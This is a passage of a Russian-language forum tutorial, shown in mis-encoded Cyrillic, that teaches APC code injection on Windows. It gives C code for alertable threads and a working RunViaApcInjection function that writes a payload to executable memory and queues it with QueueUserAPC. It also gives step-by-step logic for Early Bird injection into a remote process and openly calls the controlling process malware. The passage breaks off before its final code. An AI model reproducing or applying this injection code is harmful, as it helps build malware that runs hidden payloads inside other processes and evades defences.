<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–π</b><br />
<br />
–ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω—ã –ø—Ä–∏–º–µ—Ä—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–π –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞ —Ç–µ–∫—É—â–µ–≥–æ –ø–æ—Ç–æ–∫–∞ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏.<br />
<br />
–ò—Å–ø–æ–ª—å–∑—É—è Sleep:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>VOID AlertableFunction1() {
Sleep(-1);
}</code></pre>
	</div>
</div><br />
–ò—Å–ø–æ–ª—å–∑—É—è SleepEx:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>VOID AlertableFunction2() {
SleepEx(INFINITE, TRUE);
}</code></pre>
	</div>
</div><br />
–ò—Å–ø–æ–ª—å–∑—É—è WaitForSingleObject:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>VOID AlertableFunction3() {
HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
if (hEvent){
 WaitForSingleObject(hEvent, INFINITE);
 CloseHandle(hEvent);
}
}</code></pre>
	</div>
</div><br />
–ò—Å–ø–æ–ª—å–∑—É—è MsgWaitForMultipleObjects:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>VOID AlertableFunction4() {
HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
if (hEvent) {
MsgWaitForMultipleObjects(1, &amp;hEvent, TRUE, INFINITE, QS_INPUT);
 CloseHandle(hEvent);
}
}</code></pre>
	</div>
</div><br />
–ò—Å–ø–æ–ª—å–∑—É—è SignalObjectAndWait:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>VOID AlertableFunction5() {
HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);
HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);
if (hEvent1 &amp;&amp; hEvent2) {
 SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
 CloseHandle(hEvent1);
 CloseHandle(hEvent2);
}
}</code></pre>
	</div>
</div><br />
<b><u>–ü–æ—Ç–æ–∫–∏ —Å–æ–∑–¥–∞–Ω–Ω—ã–µ –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏, —Ç–∞–∫–∂–µ –º–æ–≥—É—Ç –≤—ã–ø–æ–ª–Ω–∏—Ç—å—Å—è.</u></b><br />
–ï—Å–ª–∏ —Ü–µ–ª–µ–≤–æ–π –ø–æ—Ç–æ–∫ —Å–æ–∑–¥–∞–µ—Ç—Å—è –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏. –ï—Å–ª–∏ —ç—Ç–æ—Ç –º–µ—Ç–æ–¥ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏,<b><u> —Å–Ω–∞—á–∞–ª–∞ —Å–ª–µ–¥—É–µ—Ç –≤—ã–∑–≤–∞—Ç—å QueueUserAPC, –∞ –∑–∞—Ç–µ–º –≤–æ–∑–æ–±–Ω–æ–≤–∏—Ç—å –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–π –ø–æ—Ç–æ–∫.</u></b> –ü—Ä–∏ —ç—Ç–æ–º –ø–æ—Ç–æ–∫ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Å–æ–∑–¥–∞–Ω –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏, –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–≥–æ –ø–æ—Ç–æ–∫–∞ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç.<br />
<br />
–ö–æ–¥, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ, –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç APC-–∏–Ω—ä–µ–∫—Ü–∏—é —á–µ—Ä–µ–∑ –ø–æ—Ç–æ–∫ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏ –∏ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–π –ø–æ—Ç–æ–∫.<br />
<br />
<b>–õ–æ–≥–∏–∫–∞ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ APC-–∏–Ω—ä–µ–∫—Ü–∏–∏</b><br />
<br />
–í –∫–∞—á–µ—Å—Ç–≤–µ –∏—Ç–æ–≥–∞, –ª–æ–≥–∏–∫–∞ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –±—É–¥–µ—Ç —Å–ª–µ–¥—É—é—â–µ–π:<br />
<br />
–°–Ω–∞—á–∞–ª–∞ —Å–æ–∑–¥–∞–π—Ç–µ –ø–æ—Ç–æ–∫, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–ø–æ–ª–Ω—è–µ—Ç –æ–¥–Ω—É –∏–∑ –≤—ã—à–µ—É–ø–æ–º—è–Ω—É—Ç—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π, —á—Ç–æ–±—ã –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –µ–≥–æ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏. –í–Ω–µ–¥—Ä–∏—Ç–µ –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –≤ –ø–∞–º—è—Ç—å. –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø–æ—Ç–æ–∫–∞ –∏ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –±—É–¥—É—Ç –ø–µ—Ä–µ–¥–∞–Ω—ã –≤ –∫–∞—á–µ—Å—Ç–≤–µ –≤—Ö–æ–¥–Ω—ã—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –≤ QueueUserAPC.<br />
<br />
<b>–§—É–Ω–∫—Ü–∏—è APC-–∏–Ω—ä–µ–∫—Ü–∏–∏ RunViaApcInjection </b>‚Äî —ç—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–ø–æ–ª–Ω—è–µ—Ç APC-–∏–Ω—ä–µ–∫—Ü–∏—é –∏ —Ç—Ä–µ–±—É–µ—Ç 3 –∞—Ä–≥—É–º–µ–Ω—Ç–∞:<br />
<br />
hThread - –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø–æ—Ç–æ–∫–∞, –Ω–∞—Ö–æ–¥—è—â–µ–≥–æ—Å—è –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏ –∏–ª–∏ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ.<br />
pPayload - –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
sPayloadSize - –†–∞–∑–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

PVOID pAddress = NULL;
DWORD dwOldProtection = NULL;

pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (pAddress == NULL) {
    printf(&quot;\t[!] VirtualAlloc –Ω–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, GetLastError());
    return FALSE;
}

memcpy(pAddress, pPayload, sPayloadSize);

if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
    printf(&quot;\t[!] VirtualProtect –Ω–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, GetLastError());
    return FALSE;
}

// –ï—Å–ª–∏ hThread –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏, QueueUserAPC –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É
// –ï—Å–ª–∏ hThread –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏, –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –Ω–µ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞, –ø–æ–∫–∞ –ø–æ—Ç–æ–∫ –Ω–µ –±—É–¥–µ—Ç –≤–æ–∑–æ–±–Ω–æ–≤–ª–µ–Ω –ø–æ—Å–ª–µ —ç—Ç–æ–≥–æ
if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
    printf(&quot;\t[!] QueueUserAPC –Ω–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, GetLastError());
    return FALSE;
}

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ - APC-–∏–Ω—ä–µ–∫—Ü–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø–æ—Ç–æ–∫–∞ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782911317.png"
		data-src="https://osint42.org/attachments/1746782911317-png.134/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782911317-png.134/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782911317.png"
			title="1746782911317.png"
			width="1360" height="699" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782918539.png"
		data-src="https://osint42.org/attachments/1746782918539-png.135/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782918539-png.135/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782918539.png"
			title="1746782918539.png"
			width="1013" height="689" loading="lazy" />
	</div><br />
<br />
<b>–î–µ–º–æ - APC-–∏–Ω—ä–µ–∫—Ü–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø–æ—Ç–æ–∫–∞ –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782926397.png"
		data-src="https://osint42.org/attachments/1746782926397-png.136/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782926397-png.136/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782926397.png"
			title="1746782926397.png"
			width="1264" height="608" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782933674.png"
		data-src="https://osint42.org/attachments/1746782933674-png.137/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782933674-png.137/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782933674.png"
			title="1746782933674.png"
			width="1194" height="688" loading="lazy" />
	</div><br />
<br />
<b>APC Injection –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ</b><br />
<br />
–¢–µ–ø–µ—Ä—å –ø—Ä–µ–¥–ª–∞–≥–∞—é –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–æ—Ç –∂–µ API –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ. –•–æ—Ç—è –ø–æ–¥—Ö–æ–¥ –Ω–µ–º–Ω–æ–≥–æ –æ—Ç–ª–∏—á–∞–µ—Ç—Å—è, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –º–µ—Ç–æ–¥ –æ—Å—Ç–∞–µ—Ç—Å—è —Ç–µ–º –∂–µ.<br />
<br />
–ö —ç—Ç–æ–º—É –º–æ–º–µ–Ω—Ç—É –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —Ö–æ—Ä–æ—à–æ –ø–æ–Ω—è—Ç–Ω–æ, —á—Ç–æ –∏–Ω—ä–µ–∫—Ü–∏—è APC —Ç—Ä–µ–±—É–µ—Ç <b><u>–ª–∏–±–æ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞, –ª–∏–±–æ –ø–æ—Ç–æ–∫–∞ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏</u></b> –¥–ª—è —É—Å–ø–µ—à–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
–û–¥–Ω–∞–∫–æ —Ç—Ä—É–¥–Ω–æ –Ω–∞–π—Ç–∏ –ø–æ—Ç–æ–∫–∏ –≤ —ç—Ç–∏—Ö —Å–æ—Å—Ç–æ—è–Ω–∏—è—Ö, –æ—Å–æ–±–µ–Ω–Ω–æ —Ç–µ, –∫–æ—Ç–æ—Ä—ã–µ —Ä–∞–±–æ—Ç–∞—é—Ç —Å –æ–±—ã—á–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.<br />
<br />
–†–µ—à–µ–Ω–∏–µ —Å–æ—Å—Ç–æ–∏—Ç –≤ —Å–æ–∑–¥–∞–Ω–∏–∏ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º WinAPI CreateProcess –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –µ–≥–æ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞. –ü—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–π –ø–æ—Ç–æ–∫ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç –∫—Ä–∏—Ç–µ—Ä–∏—è–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ APC –∏–Ω—ä–µ–∫—Ü–∏–∏. –≠—Ç–æ—Ç –º–µ—Ç–æ–¥ –∏–∑–≤–µ—Å—Ç–µ–Ω –∫–∞–∫ —Ä–∞–Ω–Ω—è—è –∏–Ω—ä–µ–∫—Ü–∏—è APC (<b>Early Bird APC Injection</b>).<br />
<br />
<b>–õ–æ–≥–∏–∫–∞ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ Early Bird. –õ–æ–≥–∏–∫–∞ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —ç—Ç–æ–π —Ç–µ—Ö–Ω–∏–∫–∏ –±—É–¥–µ—Ç —Å–ª–µ–¥—É—é—â–µ–π:</b><br />
<ol>
<li data-xf-list-type="ol">–°–æ–∑–¥–∞—Ç—å –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å, –∏—Å–ø–æ–ª—å–∑—É—è —Ñ–ª–∞–≥ CREATE_SUSPENDED.</li>
<li data-xf-list-type="ol">–ó–∞–ø–∏—Å–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –≤ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –Ω–æ–≤–æ–≥–æ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ol">–ü–æ–ª—É—á–∏—Ç—å –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –∏–∑ CreateProcess –≤–º–µ—Å—Ç–µ —Å –±–∞–∑–æ–≤—ã–º –∞–¥—Ä–µ—Å–æ–º –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏ –ø–µ—Ä–µ–¥–∞—Ç—å –∏—Ö –≤ QueueUserAPC.</li>
<li data-xf-list-type="ol">–í–æ–∑–æ–±–Ω–æ–≤–∏—Ç—å –ø–æ—Ç–æ–∫ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º WinAPI ResumeThread –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.</li>
</ol><b>–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–± —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ Early Bird APC Injection:</b><br />
<br />
–ë—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è CreateProcess, –Ω–æ —Ñ–ª–∞–≥ —Å–æ–∑–¥–∞–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –±—É–¥–µ—Ç –∏–∑–º–µ–Ω–µ–Ω —Å CREATE_SUSPENDED –Ω–∞ DEBUG_PROCESS. –§–ª–∞–≥ DEBUG_PROCESS —Å–æ–∑–¥–∞–µ—Ç –Ω–æ–≤—ã–π –ø—Ä–æ—Ü–µ—Å—Å –≤ –∫–∞—á–µ—Å—Ç–≤–µ –æ—Ç–ª–∞–∂–∏–≤–∞–µ–º–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ –¥–µ–ª–∞–µ—Ç –ª–æ–∫–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –µ–≥–æ –æ—Ç–ª–∞–¥—á–∏–∫–æ–º. –ö–æ–≥–¥–∞ –ø—Ä–æ—Ü–µ—Å—Å —Å–æ–∑–¥–∞–µ—Ç—Å—è –∫–∞–∫ –æ—Ç–ª–∞–∂–∏–≤–∞–µ–º—ã–π –ø—Ä–æ—Ü–µ—Å—Å, —Ç–æ—á–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–∞ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –≤ –µ–≥–æ —Ç–æ—á–∫–µ –≤—Ö–æ–¥–∞. <b><u>–≠—Ç–æ –ø—Ä–∏–æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å –∏ –æ–∂–∏–¥–∞–µ—Ç, –∫–æ–≥–¥–∞ –æ—Ç–ª–∞–¥—á–∏–∫ (—Ç–æ –µ—Å—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û) –≤–æ–∑–æ–±–Ω–æ–≤–∏—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ.</u></b><br />
<br />
–ö–æ–≥–¥–∞ —ç—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç, –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –≤–Ω–µ–¥—Ä—è–µ—Ç—Å—è –≤ —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å –ø–æ–º–æ—â—å—é WinAPI QueueUserAPC. –ü–æ—Å–ª–µ –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏ –ø–æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤ –æ—á–µ—Ä–µ–¥—å –æ—Ç–ª–∞–∂–∏–≤–∞–µ–º–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –ª–æ–∫–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –º–æ–∂–µ—Ç –±—ã—Ç—å –æ—Ç—Å–æ–µ–¥–∏–Ω–µ–Ω –æ—Ç —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º DebugActiveProcessStop WinAPI, —á—Ç–æ –ø—Ä–µ–∫—Ä–∞—â–∞–µ—Ç –æ—Ç–ª–∞–¥–∫—É —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
DebugActiveProcessStop —Ç—Ä–µ–±—É–µ—Ç —Ç–æ–ª—å–∫–æ –æ–¥–Ω–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π PID –æ—Ç–ª–∞–∂–∏–≤–∞–µ–º–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –∏–∑ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã PROCESS_INFORMATION, –∑–∞–ø–æ–ª–Ω–µ–Ω–Ω–æ–π CreateProcess.<br />
<br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–Ω–∞—è –ª–æ–≥–∏–∫–∞ –±—É–¥–µ—Ç —Å–ª–µ–¥—É—é—â–µ–π:</b><br />
<ol>
<li data-xf-list-type="ol">–°–æ–∑–¥–∞—Ç—å –æ—Ç–ª–∞–∂–∏–≤–∞–µ–º—ã–π –ø—Ä–æ—Ü–µ—Å—Å, —É—Å—Ç–∞–Ω–æ–≤–∏–≤ —Ñ–ª–∞–≥ DEBUG_PROCESS.</li>
<li data-xf-list-type="ol">–ó–∞–ø–∏—Å–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –≤ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –Ω–æ–≤–æ–≥–æ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ol">–ü–æ–ª—É—á–∏—Ç—å –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ—Ç–ª–∞–∂–∏–≤–∞–µ–º–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –∏–∑ CreateProcess –≤–º–µ—Å—Ç–µ —Å –±–∞–∑–æ–≤—ã–º –∞–¥—Ä–µ—Å–æ–º –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏ –ø–µ—Ä–µ–¥–∞—Ç—å –∏—Ö –≤ QueueUserAPC.</li>
<li data-xf-list-type="ol">–ü—Ä–µ–∫—Ä–∞—Ç–∏—Ç—å –æ—Ç–ª–∞–¥–∫—É —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º DebugActiveProcessStop, –∫–æ—Ç–æ—Ä—ã–π –≤–æ–∑–æ–±–Ω–æ–≤–ª—è–µ—Ç –µ–≥–æ –ø–æ—Ç–æ–∫–∏ –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É.</li>
</ol><b><u>–ü—Ä–∏–º–µ—Ä —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏:</u></b><br />
<br />
CreateSuspendedProcess2 - —ç—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–∑–¥–∞–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏:<br />
<ul>
